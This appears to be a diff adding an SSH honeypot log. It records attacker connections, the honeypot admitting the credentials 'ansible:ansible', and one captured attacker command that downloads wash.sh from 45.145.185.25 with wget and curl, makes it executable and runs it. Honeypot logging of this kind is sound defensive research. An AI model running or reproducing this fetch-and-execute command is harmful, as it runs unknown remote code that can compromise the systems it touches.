@@ -1,0 +1,23 @@
+2020-11-07 15:00:37.231 - [Info] MITM Version: 1.26
+2020-11-07 15:00:37.235 - [Info] Auto Access Enabled: true
+2020-11-07 15:00:37.236 - [Debug] [Init] Auto Access Barrier: true
+2020-11-07 15:00:37.249 - [Info] SSH man-in-the-middle server for 172.20.0.203 listening on 0.0.0.0:10002
+2020-11-07 15:34:27.054 - [Debug] [Connection] Attacker connected: 45.14.224.99 | Client Identification: SSH-2.0-libssh-0.1
+2020-11-07 15:34:27.180 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 15:34:27.409 - [Debug] [Connection] Attacker connected: 45.14.224.99 | Client Identification: SSH-2.0-libssh-0.1
+2020-11-07 15:34:27.497 - [Debug] [Connection] Attacker closed the connection
+2020-11-07 15:57:53.510 - [Debug] [Connection] Attacker connected: 45.145.185.25 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-07 15:57:54.437 - [Debug] [Auth] Attacker 45.145.185.25 trying to authenticate with "password"
+2020-11-07 15:57:54.438 - [Debug] [Auto Access] Attacker: 45.145.185.25, Threshold: 1, Attempts: 1
+2020-11-07 15:57:54.438 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-07 15:57:54.438 - [Debug] [Auto Access] Adding the following credentials: "ansible:ansible"
+2020-11-07 15:57:54.672 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-07 15:57:54.673 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.203
+2020-11-07 15:57:54.697 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-07 15:57:55.157 - [Debug] [EXEC] Noninteractive mode attacker command: wget http://45.145.185.25/wash.sh; curl -O http://45.145.185.25/wash.sh; chmod 777 wash.sh; sh wash.sh
+2020-11-07 15:58:55.766 - [Debug] [Connection] Client error on ssh server
+2020-11-07 15:58:55.767 - [Debug] [Connection] Attacker closed connection
+2020-11-07 15:58:55.771 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-07 15:58:55.771 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-07 16:02:56.031 - [Info] Exiting...
+2020-11-07 16:02:56.032 - [Debug] Cleaning up...
